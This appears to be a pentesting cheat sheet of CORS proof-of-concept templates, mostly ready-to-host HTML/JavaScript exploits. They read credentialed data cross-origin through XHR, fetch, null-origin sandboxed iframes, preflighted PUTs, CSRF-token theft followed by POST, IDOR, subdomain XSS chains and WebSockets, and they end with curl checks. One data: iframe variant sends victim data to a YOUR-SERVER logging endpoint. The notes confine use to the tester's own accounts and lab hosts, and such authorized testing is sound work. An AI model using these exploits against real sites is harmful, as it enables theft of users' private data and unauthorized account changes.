# CORS PoC Templates

Host on a domain you control or `localhost`. Open in your own victim browser profile logged in to your own account. Show the data in the page or send it to your own logging server only, then delete logs. Replace `TARGET` and paths.

Online helper: https://tools.honoki.net/cors.html

## 1. XHR with credentials (button)

```html
<html><body>
<h2>CORS PoC</h2>
<div id="demo"><button type="button" onclick="cors()">Exploit</button></div>
<pre id="out"></pre>
<script>
function cors() {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4) {
      document.getElementById("out").textContent = this.status + "\n" + this.responseText;
    }
  };
  xhr.open("GET", "https://TARGET/api/v1/me", true);
  xhr.withCredentials = true;
  xhr.send();
}
</script>
</body></html>
```

## 2. fetch with credentials (auto)

```html
<pre id="out"></pre>
<script>
fetch("https://TARGET/api/v1/me", {credentials: "include"})
  .then(r => r.text())
  .then(t => {
    document.getElementById("out").textContent = t;
    // Optional: send to your own server only
    // fetch("https://YOUR-SERVER/log", {method: "POST", body: t});
  })
  .catch(e => document.getElementById("out").textContent = "blocked: " + e);
</script>
```

## 3. null origin via sandboxed iframe

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
fetch('https://TARGET/api/v1/me', {credentials: 'include'})
  .then(r => r.text())
  .then(t => parent.postMessage(t, '*'));
</script>"></iframe>
<pre id="out"></pre>
<script>
window.addEventListener("message", e => document.getElementById("out").textContent = e.data);
</script>
```

`data:` variant (from the source notes):

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
fetch('https://TARGET/sensitive-victim-data', {credentials: 'include'})
  .then(r => r.text())
  .then(t => { document.location = 'https://YOUR-SERVER/log?key=' + encodeURIComponent(t); });
</script>"></iframe>
```

## 4. Preflighted request (custom header, PUT, JSON)

```html
<pre id="out"></pre>
<script>
fetch("https://TARGET/api/v1/settings", {
  method: "PUT",
  credentials: "include",
  headers: {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
  body: JSON.stringify({display_name: "CORS_TEST"})
}).then(r => r.text()).then(t => document.getElementById("out").textContent = t)
  .catch(e => document.getElementById("out").textContent = "preflight blocked: " + e);
</script>
```

Works only if the preflight allows your origin, the method, and the headers.

## 5. CORS to CSRF (read token, then act)

```html
<pre id="out"></pre>
<script>
fetch("https://TARGET/account/settings", {credentials: "include"})
  .then(r => r.text())
  .then(html => {
    const token = (html.match(/name="csrf_token" value="([^"]+)"/) || [])[1];
    document.getElementById("out").textContent = "token: " + token;
    const f = new URLSearchParams({display_name: "CORS_CSRF_TEST", csrf_token: token});
    return fetch("https://TARGET/account/settings", {method: "POST", credentials: "include", body: f});
  })
  .then(r => r && r.status && (document.getElementById("out").textContent += "\nPOST status " + r.status));
</script>
```

## 6. IDOR via CORS (own two accounts only)

```html
<pre id="out"></pre>
<script>
const ids = ["OWN_ID_A", "OWN_ID_B"];   // only IDs of accounts you own
Promise.all(ids.map(id =>
  fetch("https://TARGET/api/users/" + id, {credentials: "include"}).then(r => r.text())
)).then(rs => document.getElementById("out").textContent = rs.join("\n\n"));
</script>
```

## 7. Internal network without credentials (report-only template)

```html
<script>
// Demonstrates ACAO:* on an intranet host reachable by the victim. Use only against a lab host you own.
fetch("http://INTERNAL-LAB-HOST/status").then(r => r.text()).then(t => console.log(t));
</script>
```

## 8. XSS on a trusted subdomain (chain)

Payload placed through an XSS you proved on `https://sub.TARGET` (own account, approved chain):

```html
<script>
fetch("https://TARGET/api/v1/me", {credentials: "include"})
  .then(r => r.text()).then(t => console.log("read via trusted subdomain:", t));
</script>
```

## 9. WebSocket upgrade without Origin check

```html
<pre id="out"></pre>
<script>
const ws = new WebSocket("wss://TARGET/socket");
ws.onopen = () => ws.send('{"action":"get_profile"}');
ws.onmessage = e => document.getElementById("out").textContent += e.data + "\n";
</script>
```

## curl checks

```bash
# Reflection with credentials
curl -s -I 'https://TARGET/api/v1/me' -H 'Origin: https://attacker.example' -H 'Cookie: session=OWN'
# null
curl -s -I 'https://TARGET/api/v1/me' -H 'Origin: null' -H 'Cookie: session=OWN'
# Preflight
curl -s -i -X OPTIONS 'https://TARGET/api/v1/me' -H 'Origin: https://attacker.example' \
  -H 'Access-Control-Request-Method: PUT' -H 'Access-Control-Request-Headers: Authorization, X-Custom'
# Method switch
curl -s -I -X POST 'https://TARGET/api/v1/me' -H 'Origin: https://attacker.example' -H 'Cookie: session=OWN'
```

## Evidence to capture

Request with Origin, response headers (ACAO, ACAC, Vary, Allow-Methods/Headers), the PoC page, browser name and version, cookie SameSite values, and a screenshot of your own data read cross-origin.
